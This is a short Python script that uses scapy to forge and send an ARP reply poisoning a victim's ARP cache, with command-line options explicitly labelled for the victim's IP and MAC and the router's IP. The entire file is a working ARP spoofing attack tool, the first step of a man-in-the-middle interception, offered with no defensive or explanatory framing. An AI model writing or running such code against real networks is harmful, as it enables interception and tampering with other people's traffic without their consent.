import scapy.all as scapy
import argparse

def create_packet(ip, mac, route_ip):
    packet = scapy.ARP(
        op=2,
        pdst=ip,
        hwdst=mac,
        psrc=route_ip
    )
    return packet


argparser = argparse.ArgumentParser()
argparser.add_argument('-ti', type=str, dest='ti', help='IP of victim') # target ip
argparser.add_argument('-tm', type=str, dest='tm', help='MAC of victim') # target mac
argparser.add_argument('-ri', type=str, dest='ri', help='IP of route') # route ip
args = argparser.parse_args()


packet = create_packet(args.ti, args.tm, args.ri)
scapy.send(packet)